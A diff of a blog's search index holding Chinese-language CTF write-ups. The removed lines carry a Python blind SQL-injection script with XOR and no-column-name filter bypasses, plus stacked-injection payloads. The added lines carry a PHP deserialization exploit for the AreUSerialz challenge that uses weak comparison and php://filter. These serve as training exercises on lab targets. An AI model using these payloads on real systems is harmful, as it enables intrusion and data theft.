-思路1. 先输入1‘，1“，只返回了bool(false),并没有具体的报错信息，所以报错应该不回显，排除报错注入2. 依次输入id&#x3D;1，id&#x3D;2,id&#x3D;3,id&#x3D;0.发现id&#x3D;1时返回NULL,id&#x3D;2时返回V&amp;N,id&gt;&#x3D;3或&lt;&#x3D;0时返回Error Occured When Fetch Result.可用布尔盲注3. 用sql字典爆破出被过滤的字符，发现if,union,or,and，information等字符被过滤了，还可以用^异或来进行布尔盲注4. information_schema无法使用，可以用sys.schema_table_statistics_with_buffer库和sys.x$schema_flattened_keys库代替来查找表名，效果与imformation_schema.tables库相同5. 但是无法查找列名，所以用无列名注入法，查找列的内容，这里用到了ascii位偏移
-
-给定两个字符串，会各取两个字符串的首字符ascii码来比较，不等式成立返回1，不等式不成立返回0,且两个比较的列数和非比较列要相同（比如select 1,”b”中，1是非比较列，b是比较列），如果两个首字符的ascii码都相等则比较第二个字符，以此类推；如果前面的字符都相等，一个后面有字符，另一个没有字符，则有字符的大。
-
-
-6. 根据以上规律，写出盲注脚本import requestsimport timeurl = &quot;http://ad2dd0bd-164d-4573-92ac-bb267528221b.node5.buuoj.cn:81/index.php&quot;result = &quot;&quot;session = requests.Session()for i in range(1, 1000):    found = False    for ascii_val in range(32, 127):          flag = result + chr(ascii_val)        #payload = f&quot;1^(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema = database()),&#123;i&#125;,1))=&#123;ascii_val&#125;)&quot;        payload = f&quot;1^((select 1,&#x27;&#123;flag&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;        data = &#123;&quot;id&quot;: payload&#125;        r = session.post(url, data=data)        time.sleep(0.1)        if &quot;When&quot; in r.text:            result += chr(ascii_val-1)            print(result)            found = True            break    if not found:        break    print(f&quot;Flag 获取完成: &#123;result&#125;&quot;)
-7. 先用sys.schema_table_statistics_with_buffer代替information_schema.tables库，查找到表名f1ag_1s_h3r3_hhhhh，再无列名注入查找flag
-八.[SUCTF 2019]EasySQL 堆叠注入1. 先输入1或&gt;&#x3D;1的数返回Array ( [0] &#x3D;&gt; 1 )，输入0或字符无回显，返回为空，推断可能有||结构
-||运算规则：首先0和字符为假，非0数字为真，如果第一个为真直接返回真，如果第一个为假则判断后一个，如果后一个为假则返回假，如果后一个为真则返回真
-
-2. 根据前面的返回，则判断后一个为假内容及[输入的数据] || 假，所以结构应该为 ‘select [输入的数据] || 假 from Flag’3. 所以可以用*,1绕过||运算，返回所有字段的内容
-输入*,1后，结构变为 ‘select ,1 || 假 from Flag’ 因为 ‘1||假‘&#x3D;1，所以返回所有字段的内容(包括flag)为什么是,1，而不是*,0&#x2F;字符？因为0和字符为假，0 || 假返回空无回显，无法查看flag
-
-
-4. 最终获取flag另一种方法是通过 set sql_mode 将 || 的语义强制转换为字符串连接符。执行以下两个步骤的 payload：
-首先执行 1;set sql_mode&#x3D;PIPES_AS_CONCAT;
-然后执行 select 1。
-
-这样做能将 || 从逻辑”或”运算符转换为与 Oracle 数据库兼容的字符串连接符，从而拼接并输出完整的 flag 内容。
+get传输序列化payload，得到flag
 ]]></content>
       <tags>
         <tag>解题wp</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -2522,6 +2420,108 @@ $sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `ol
 ]]></content>
       <tags>
         <tag>解题wp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[网鼎杯 2020 青龙组]AreUSerialz(反序列化，弱比较)</title>
+    <url>/2026/05/17/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8C%E5%BC%B1%E6%AF%94%E8%BE%83/</url>
+    <content><![CDATA[题目分析题目概述本题是一道典型的 PHP 反序列化漏洞题目，主要考察对 PHP 反序列化机制和比较运算符的理解。
+关键代码&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;        $op = &quot;1&quot;;        $filename = &quot;/tmp/tmpfile&quot;;        $content = &quot;Hello World!&quot;;    &#125;    function process() &#123;        if($this-&gt;op == &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;            $res = $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;            if(strlen((string)$this-&gt;content) &gt; 100) &#123;                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res = file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        $res = &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res = file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;    private function output($s) &#123;        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    &#125;    function __destruct() &#123;        if($this-&gt;op === &quot;2&quot;)            $this-&gt;op = &quot;1&quot;;        $this-&gt;content = &quot;&quot;;        $this-&gt;process();    &#125;&#125;function is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;    $str = (string)$_GET[&#x27;str&#x27;];    if(is_valid($str)) &#123;        $obj = unserialize($str);    &#125;&#125;?&gt;
+
+漏洞分析核心漏洞：比较运算符不一致这是本题的关键漏洞！代码中存在比较运算符不一致的问题：
+
+__destruct() 使用严格比较：$this-&gt;op === &quot;2&quot;
+process() 使用非严格比较：$this-&gt;op == &quot;2&quot;
+
+漏洞原理在 PHP 中：
+
+严格比较 ===：要求值和类型都相同
+非严格比较 ==：只要求值相同，会进行类型转换
+
+
+
+
+比较表达式
+结果
+原因
+
+
+
+2 === &quot;2&quot;
+false
+类型不同（整数 vs 字符串）
+
+
+2 == &quot;2&quot;
+true
+值相同（都会转换为数字2）
+
+
+利用思路需要构造一个反序列化 payload，使得：
+
+__destruct() 中 $this-&gt;op === &quot;2&quot; 返回 false（不修改 op 值）
+process() 中 $this-&gt;op == &quot;2&quot; 返回 true（执行 read 方法）
+
+Payload 构造方法一：使用整数类型的 opO:11:&quot;FileHandler&quot;:2:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;
+
+解释：
+
+O:11:&quot;FileHandler&quot;：反序列化为 FileHandler 对象
+s:2:&quot;op&quot;;i:2：设置 op 为整数 2（不是字符串 “2”）
+s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;：设置要读取的文件为 flag.php
+
+方法二：使用公共属性覆盖（无需前缀）由于代码直接访问 $this-&gt;op，我们可以使用公共属性名称，不需要 %00*%00 前缀：
+// 类中定义的是 protected $op// 但我们可以直接使用 &quot;op&quot; 创建公共属性O:11:&quot;FileHandler&quot;:2:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;
+
+原理：当反序列化时创建公共属性 $op，PHP 会优先访问公共属性。
+完整利用过程1. 发送 Payload?str=O:11:&quot;FileHandler&quot;:2:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;
+
+2. 执行流程反序列化 → 对象创建 → __destruct() 调用        ↓$this-&gt;op = 2 (整数)        ↓$this-&gt;op === &quot;2&quot; → false (严格比较失败)        ↓$this-&gt;content = &quot;&quot;        ↓process() 调用        ↓$this-&gt;op == &quot;2&quot; → true (非严格比较成功)        ↓read() 执行，读取 flag.php        ↓output() 输出文件内容
+
+3. 获取 Flag
+执行后并没有显示 flag 内容，说明文件没有直接输出flag,而是把flag设置在变量里可以把payload中的filename改为php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php,获得文件的base64编码
+
+
+
+然后解码得到flag
+
+
+技术要点总结1. PHP 反序列化属性访问优先级
+
+
+属性类型
+访问优先级
+序列化格式
+
+
+
+公共属性
+最高
+属性名
+
+
+protected
+次之
+\x00*\x00属性名
+
+
+private
+最低
+\x00类名\x00属性名
+
+
+2. 比较运算符差异// 严格比较（类型+值）$a === $b// 非严格比较（仅值）$a == $b
+
+3. is_valid 函数绕过function is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;
+
+该函数只检查可打印 ASCII 字符（32-125），我的 payload 完全由可打印字符组成，因此可以顺利通过检查。
+Flagflag&#123;feff0449-1519-4e96-a316-c09b469eb5d6&#125;
+
+总结本题的核心在于比较运算符不一致导致的漏洞。通过巧妙构造反序列化 payload，利用整数和字符串的弱比较特性，成功绕过了 __destruct() 的限制，最终读取了 flag 文件。
+]]></content>
+      <tags>
+        <tag>解题wp</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
 </search>
